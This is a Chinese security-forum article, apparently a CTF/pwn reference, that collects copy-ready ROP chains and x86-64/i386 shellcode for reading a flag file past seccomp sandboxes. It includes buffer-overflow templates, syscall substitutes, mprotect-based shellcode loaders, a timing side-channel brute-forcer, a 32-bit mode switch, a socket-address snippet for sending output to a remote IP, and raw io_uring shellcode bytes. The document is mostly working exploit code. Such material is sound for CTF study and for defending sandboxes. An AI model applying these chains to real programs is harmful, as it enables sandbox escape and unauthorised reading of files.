# 对二进制安全中沙盒的深入了解与分析(rop与shellcode集合)-先知社区

> **来源**: https://xz.aliyun.com/news/17737  
> **文章ID**: 17737

---

## 前言

### 起因

在每次遇到沙盒时都要重新写rop或者shellcode，这非常不健康，所以我写了这篇文章，尽可能的让这里的代码能拿来就能用。

在正篇里将直接用rop或shellcode中使用的函数进行命名，这样可以快速并清晰的找到要用的代码。

**注意: open+read+write为模版，之后相对应的代码可以直接进行替换，比如pread64可以直接将read进行替换（活字印刷术）。**

以下为例题程序

```
# rop对应程序
int __fastcall main(int argc, const char **argv, const char **envp)
{
char v4[16]; // [rsp+0h] [rbp-10h] BYREF

printf("%lp
", &printf, envp);
gets(v4);
return 0;
}
```

```
# python3脚本
from pwncli import *
context(arch='amd64',os='linux',log_level='debug')
p   = lambda s,t: print(f"\033[0;31;43m{s.ljust(15, ' ') + '------------------------->' + hex(t)}\033[0m")

sh = process("./rop")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

libc.address = eval(sh.recvline()) - libc.sym["printf"]

# ---------需要更改
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x0000000000163f88
pop_rdx_r12 = libc.address + 0x000000000011f2e7
pop_rcx = libc.address + 0x000000000003d1ee

rop = b"a"*0x18 + [rop程序]  # ------
sh.sendline(rop)

sh.interactive()
```

> ![](C:\Users\PRS\AppData\Roaming\Typora\typora-user-images\image-20250408184723448.png)

```
# python3脚本
from pwncli import *
context(arch='amd64',os='linux',log_level='debug')
p   = lambda s,t: print(f"\033[0;31;43m{s.ljust(15, ' ') + '------------------------->' + hex(t)}\033[0m")

sh = process("./shellcode")

shellcode = [shellcode代码] #-----------
sh.sendline(asm(shellcode))

sh.interactive()
```

### 沙盒

沙盒是一种对程序的保护，他可以禁用一些系统调用从而增加pwn题目的难度，迫使pwner们通过ORW的方法进行绕过沙盒。比如最常见的禁用execve，那么就只能通过open，read，write来直接读取flag的内容。

### 沙盒检测

```
seccomp-tools dump ./pwn
```

## 正篇

### open+read+write

#### rop

```
rop = b"a"*0x18
rop += flat(pop_rdi, 0, pop_rsi, libc.sym["_IO_list_all"]+8, pop_rdx_r12, 0x200, 0, libc.sym["read"])  # read
rop += flat(pop_rdi, libc.sym["_IO_list_all"]+8, pop_rsi, 0, pop_rdx_r12, 0, 0, libc.sym["open"])  # open
rop += flat(pop_rdi, 3, pop_rsi, libc.sym["_IO_list_all"]+8, pop_rdx_r12, 0x200, 0, libc.sym["read"])  # read
rop += flat(pop_rdi, 1, pop_rsi, libc.sym["_IO_list_all"]+8, pop_rdx_r12, 0x200, 0, libc.sym["write"])  # write

sh.sendline(rop)
sh.sendline("/flag\x00")
```

#### shellcode

```
shellcode = shellcraft.amd64.pushstr("/flag")
shellcode += shellcraft.amd64.linux.open('rsp', 0, 0)
shellcode += shellcraft.amd64.linux.read('rax', 'rsp', 0x200)
shellcode += shellcraft.amd64.linux.write(1, 'rsp', 0x200)
```

```
flag_name = b'/flag'
shellcode = ""
shellcode += """ 
    mov r12,""" + str(u64(flag_name.ljust(8,b'\x00'))) + """
    mov [rsp],r12
"""

shellcode += """
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    mov rax,2
    syscall
"""   # open

shellcode += """
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall
"""   # read

shellcode += """
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 1
    syscall
"""   # write
```

### open替代

#### openat

> **rop**

```
rop += flat(pop_rdi, 3, pop_rsi, libc.sym["_IO_list_all"]+8, pop_rdx_r12, 0, 0, libc.sym["openat"])
```

> **shellcode**

```
shellcode += shellcraft.amd64.linux.openat(3,'rsp', 0)
```

```
shellcode += """
 mov rdi, 3
 mov rsi, rsp
 mov rdx, 0
 mov rax,0x101
 syscall
"""
```

#### openat2

> **rop**

```
bss_addr = 0x000000000404020 # 写bss段
exec_fd = (bss_addr >> 12) << 12
rop = b"a" * 0x18
rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym["mprotect"])
rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym["read"], exec_fd)

sh.sendline(rop)
sh.sendline([shellcode]) # 填写shellcode
```

> **shellcode**

```
shellcode += shellcraft.amd64.pushstr(p64(0))*4
shellcode += """
 mov rdx,rsp
 add rdx,0x20
"""
shellcode += shellcraft.openat2(-100,"rdx","rsp",0x18)
```

```
shellcode += """
 push 0
 push 0
 push 0
 push 0
 mov rdi, -100
 mov rsi, rsp
 add rsi, 0x20
 mov rdx, rsp
 mov r10, 0x18
 mov rax,437
 syscall
"""   # open
```

### read替代

#### pread

> **rop**

```
rop += flat(pop_rdi, 3, pop_rsi, libc.sym["_IO_list_all"]+8, pop_rdx_r12, 0x200, 0, pop_rcx, 0, libc.sym["pread"])
```

> **shellcode**

```
shellcode += shellcraft.amd64.linux.pread('rax', 'rsp', 0x200, 0)
```

```
shellcode += """
 mov rdi, 3
 mov rsi, rsp
 mov rdx, 0x100
 mov r10, 0
 mov rax, 0x11
 syscall
"""   # read
```

#### readv

> **rop**

```
bss_addr = 0x000000000404020 # 写bss段
exec_fd = (bss_addr >> 12) << 12
rop = b"a" * 0x18
rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym["mprotect"])
rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym["read"], exec_fd)

sh.sendline(rop)
sh.sendline([shellcode]) # 填写shellcode
```

> **shellcode**

```
shellcode += '''
 push 0x200
 push 0x200
 mov [rsp],rsp
'''
shellcode += shellcraft.amd64.linux.readv('rax', 'rsp', 1)
```

```
shellcode += """
 push 0x200
 push 0x200
 mov [rsp],rsp
 mov rdi, 3
 mov rsi, rsp
 mov rdx, 0x1
 mov rax, 0x13
 syscall
"""   # read
```

#### preadv

> **rop**

```
bss_addr = 0x000000000404020 # 写bss段
exec_fd = (bss_addr >> 12) << 12
rop = b"a" * 0x18
rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym["mprotect"])
rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym["read"], exec_fd)

sh.sendline(rop)
sh.sendline([shellcode]) # 填写shellcode
```

> **shellcode**

```
shellcode += '''
 push 0x200
 push 0x200
 mov [rsp],rsp
'''
shellcode += shellcraft.amd64.linux.preadv('rax', 'rsp', 1, 0)
```

```
shellcode += """
 push 0x200
 push 0x200
 mov [rsp],rsp
 mov rdi, 3
 mov rsi, rsp
 mov rdx, 0x1
 mov r10, 0
 mov rax, 0x127
 syscall
"""   # read
```

#### mmap

> **rop**

```
bss_addr = 0x000000000404020 # 写bss段
exec_fd = (bss_addr >> 12) << 12
rop = b"a" * 0x18
rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym["mprotect"])
rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym["read"], exec_fd)

sh.sendline(rop)
sh.sendline([shellcode]) # 填写shellcode
```

> **shellcode**

```
# 主要mmap映射到了0x777721000，所以之后的write也需要输出0x777721000位置的内容。
shellcode += shellcraft.amd64.linux.mmap(0x777721000, 0x100, 1, 2, 3, 0)
```

```
# 主要mmap映射到了0x777721000，所以之后的write也需要输出0x777721000位置的内容。
shellcode += """
 mov rdi, 0x777721000
 mov rsi, 0x100
 mov rdx, 1
 mov r10, 2
 mov r8, 3
 mov r9, 0
 mov rax, 9
 syscall
"""   # read
```

#### sendfile

**sendfile可以直接代替write与read**

> **rop**

```
rop += flat(pop_rdi, 1, pop_rsi, 3, pop_rdx_r12, 0, 0, pop_rcx, 0x100, libc.sym["sendfile"])
```

> **shellcode**

```
shellcode += shellcraft.amd64.linux.sendfile(1, "rax", 0, 0x200)
```

```
shellcode += """
 mov rdi, 1
 mov rsi, rax
 mov rdx, 0
 mov r10, 0x100
 mov rax, 0x28
 syscall
""" 
```

### write替代

#### writev

> **rop**

```
bss_addr = 0x000000000404020 # 写bss段
exec_fd = (bss_addr >> 12) << 12
rop = b"a" * 0x18
rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym["mprotect"])
rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym["read"], exec_fd)

sh.sendline(rop)
sh.sendline([shellcode]) # 填写shellcode
```

> **shellcode**

```
# 注意flag输出不在开头
shellcode += '''
 push 0x200
 push 0x200
 mov [rsp],rsp
'''
shellcode += shellcraft.amd64.linux.writev(1, 'rsp', 0x1)
```

```
# 注意flag输出不在开头
shellcode += """
 push 0x200
 push 0x200
 mov [rsp],rsp
 mov rdi, 1
 mov rsi, rsp
 mov rdx, 0x1
 mov rax, 0x14
 syscall
"""   # write
```

#### sendfile

**sendfile可以直接代替write与read**

> **rop**

```
rop += flat(pop_rdi, 1, pop_rsi, 3, pop_rdx_r12, 0, 0, pop_rcx, 0x100, libc.sym["sendfile"])
```

> **shellcode**

```
shellcode += shellcraft.amd64.linux.sendfile(1, "rax", 0, 0x200)
```

```
shellcode += """
 mov rdi, 1
 mov rsi, rax
 mov rdx, 0
 mov r10, 0x100
 mov rax, 0x28
 syscall
""" 
```

#### 侧信道攻击

> 这个攻击比较特殊，实在没有输出手段的时候就利用此方法，此方法相当不准确，谨慎使用。

> 如果rop同上面一样使用
>
> 来转化成写shellcode

```
bss_addr = 0x000000000404020 # 写bss段
exec_fd = (bss_addr >> 12) << 12
rop = b"a" * 0x18
rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym["mprotect"])
rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym["read"], exec_fd)

sh.sendline(rop)
sh.sendline([shellcode]) # 填写shellcode
```

接下来看shellcode怎么写。

![](C:\Users\PRS\AppData\Roaming\Typora\typora-user-images\image-20250410123209853.png)

现在假设flag已经读到了栈上，但是没有办法读（没有系统调用 & close(1)）。

那么可以进行爆破，因为没有返回，所以爆破就只能看时间来判断。

> shellcode为读取文件的code。

```
flag = ''
for offset in range(30):
 for byte in range(0x20,0x80):
     sh = process("./shellcode")
     shell = asm(shellcode + """
         infinite_loop: 
         cmp byte ptr[rsp+{}], {}
         je infinite_loop
             """.format(str(offset),str(byte)))
     sh.sendlineafter("shellcode: 
",shell)
     try:
         sh.recv(timeout=0.2)
         flag += chr(byte)
         print(flag + "---" + str(byte))
         sh.close()
         break
     except:
         pass

     print(flag + "---" + str(byte))
     sh.close()
```

![](C:\Users\PRS\AppData\Roaming\Typora\typora-user-images\image-20250410131908177.png)

> 很慢，但可行。

### 转32位

利用条件

* 沙箱没有arch==ARCH\_x86\_64检测
* 可以使用mmmap或者mprotect和32位的地址

> **rop**
>
> 可以调用mprotect来转化成写shellcode

```
bss_addr = 0x000000000404020  # 写bss段
exec_fd = (bss_addr >> 12) << 12
rop = b"a" * 0x18
rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym["mprotect"])
rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym["read"], exec_fd)

sh.sendline(rop)
sh.sendline([shellcode]) # 填写shellcode
```

> **shellcode**

```
shellcode64 = shellcraft.amd64.linux.mmap(0x700000, 0x1000, 7, 0x32, -1, 0)
shellcode64 += shellcraft.amd64.linux.read(0, 0x700000, 0x1000)
shellcode64 += """
 mov rsp,0x700800
 mov DWORD PTR [rsp+4], 0x23
 mov DWORD PTR [rsp], 0x700000
 retfd
"""
```

```
shellcode32 = """
 push 0x67616C66
"""

shellcode32 += """
 push esp
 push 0
 push 0
 pop edx
 pop ecx
 pop ebx
 push 5
 pop eax
 int 0x80
"""   # open

shellcode32 += """
 push eax
 push esp
 push 0x100
 pop edx
 pop ecx
 add ecx, 0x20
 pop ebx
 push 3
 pop eax
 int 0x80
"""   # read
shellcode32 += """
 push 1
 pop ebx
 push 4
 pop eax
 int 0x80
"""   # write
```

```
sh.sendline(asm(shellcode64, arch='amd64', bits=64))
sh.sendline(asm(shellcode32, arch='i386', bits=32))
```

### 绕过close(1)

#### 侧信道攻击

同write替代中的侧信道攻击

#### 远程链接socket&connect

有些程序会调用子进程，子进程对外开放，但是rop写后只能在主进程运行，输出没法显示在远程，或者**close(1)**，那么可以用此方法，此方法需要**公网ip**。

```
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {
    struct sockaddr_in *serv_addr = malloc(sizeof(struct sockaddr_in));
    memset(serv_addr, 0, sizeof(struct sockaddr_in));
    serv_addr->sin_family = AF_INET;
    serv_addr->sin_addr.s_addr = inet_addr("127.0.0.1");   //填入ip地址和端口
    serv_addr->sin_port = htons(8888);
    printf(%lp,*serv_addr);
    return 0;
}
```

#### `open("/dev/pts/?")`

使用`open("/dev/pts/?")`重新打开标准输出

### 超级代码

这个代码利用了下面三个个系统调用

```
9	common	mmap			__x64_sys_mmap
425	common	io_uring_setup		__x64_sys_io_uring_setup
426	common	io_uring_enter		__x64_sys_io_uring_enter
```

汇编如下

```
push   r15
mov    ecx,0x1e
push   r14
push   r13
xor    r13d,r13d
push   r12
mov    eax,r13d
push   rbp
push   rbx
sub    rsp,0x68
lea    rdi,[rsp-0x10]
lea    rsi,[rsp-0x10]
rep stos DWORD PTR es:[rdi],eax
mov    edi,0x10
mov    eax,0x1a9
syscall
mov    ebx,0x9
mov    r12,rax
mov    r14d,eax
mov    r8d,eax
xor    r9d,r9d
mov    r10d,0x1
mov    edx,0x3
xor    edi,edi
mov    esi,0x1000
mov    eax,ebx
syscall
mov    r9d,0x8000000
mov    rbp,rax
mov    eax,ebx
syscall
mov    r9d,0x10000000
mov    r15,rax
mov    eax,ebx
syscall
mov    ecx,0x10
mov    rbx,rax
mov    rdi,rax
mov    eax,r13d
rep stos DWORD PTR es:[rdi],eax
mov    edi,r12d
mov    r12d,0x1aa
xor    r9d,r9d
xor    r8d,r8d
mov    edx,0x1
mov    esi,0x1
movabs rax,0xffffff9c00001012
mov    QWORD PTR [rbx],rax
lea    rax,[rip+0xc1]        # 0x7ffcf065b5c0
mov    QWORD PTR [rbx+0x10],rax
mov    eax,DWORD PTR [rsp+0x30]
mov    DWORD PTR [rbp+rax*1+0x0],0x0
mov    eax,DWORD PTR [rsp+0x1c]
inc    DWORD PTR [rbp+rax*1+0x0]
mov    eax,r12d
syscall
mov    eax,DWORD PTR [rsp+0x54]
mov    rdi,rbx
mov    ecx,0x10
mov    edx,DWORD PTR [r15+rax*1+0x8]
mov    eax,r13d
lea    r15,[rsp-0x74]
rep stos DWORD PTR es:[rdi],eax
mov    BYTE PTR [rbx],0x16
mov    eax,DWORD PTR [rsp+0x30]
mov    edi,r14d
mov    DWORD PTR [rbx+0x4],edx
mov    edx,0x1
mov    QWORD PTR [rbx+0x10],r15
mov    DWORD PTR [rbx+0x18],0x64
mov    DWORD PTR [rbp+rax*1+0x0],0x0
mov    eax,DWORD PTR [rsp+0x1c]
inc    DWORD PTR [rbp+rax*1+0x0]
mov    eax,r12d
syscall
mov    ecx,0x10
mov    eax,r13d
mov    rdi,rbx
mov    edx,0x3
rep stos DWORD PTR es:[rdi],eax
mov    QWORD PTR [rbx+0x10],r15
mov    edi,r14d
movabs rax,0x100000017
mov    QWORD PTR [rbx],rax
mov    eax,DWORD PTR [rsp+0x30]
mov    DWORD PTR [rbx+0x18],0x64
mov    DWORD PTR [rbp+rax*1+0x0],0x0
mov    eax,DWORD PTR [rsp+0x1c]
inc    DWORD PTR [rbp+rax*1+0x0]
mov    eax,r12d
syscall
add    rsp,0x68
xor    eax,eax
pop    rbx
pop    rbp
pop    r12
pop    r13
pop    r14
pop    r15
ret
cs (bad)
```

机器码如下

```
shellcode = b'AW\xb9\x1e\x00\x00\x00AVAUE1\xedATD\x89\xe8USH\x83\xechH\x8d|$\xf0H\x8dt$\xf0\xf3\xab\xbf\x10\x00\x00\x00\xb8\xa9\x01\x00\x00\x0f\x05\xbb\t\x00\x00\x00I\x89\xc4A\x89\xc6A\x89\xc0E1\xc9A\xba\x01\x00\x00\x00\xba\x03\x00\x00\x001\xff\xbe\x00\x10\x00\x00\x89\xd8\x0f\x05A\xb9\x00\x00\x00\x08H\x89\xc5\x89\xd8\x0f\x05A\xb9\x00\x00\x00\x10I\x89\xc7\x89\xd8\x0f\x05\xb9\x10\x00\x00\x00H\x89\xc3H\x89\xc7D\x89\xe8\xf3\xabD\x89\xe7A\xbc\xaa\x01\x00\x00E1\xc9E1\xc0\xba\x01\x00\x00\x00\xbe\x01\x00\x00\x00H\xb8\x12\x10\x00\x00\x9c\xff\xff\xffH\x89\x03H\x8d\x05\xc1\x00\x00\x00H\x89C\x10\x8bD$0\xc7D\x05\x00\x00\x00\x00\x00\x8bD$\x1c\xffD\x05\x00D\x89\xe0\x0f\x05\x8bD$TH\x89\xdf\xb9\x10\x00\x00\x00A\x8bT\x07\x08D\x89\xe8L\x8d|$\x8c\xf3\xab\xc6\x03\x16\x8bD$0D\x89\xf7\x89S\x04\xba\x01\x00\x00\x00L\x89{\x10\xc7C\x18d\x00\x00\x00\xc7D\x05\x00\x00\x00\x00\x00\x8bD$\x1c\xffD\x05\x00D\x89\xe0\x0f\x05\xb9\x10\x00\x00\x00D\x89\xe8H\x89\xdf\xba\x03\x00\x00\x00\xf3\xabL\x89{\x10D\x89\xf7H\xb8\x17\x00\x00\x00\x01\x00\x00\x00H\x89\x03\x8bD$0\xc7C\x18d\x00\x00\x00\xc7D\x05\x00\x00\x00\x00\x00\x8bD$\x1c\xffD\x05\x00D\x89\xe0\x0f\x05H\x83\xc4h1\xc0[]A\A]A^A_\xc3./flag'
```
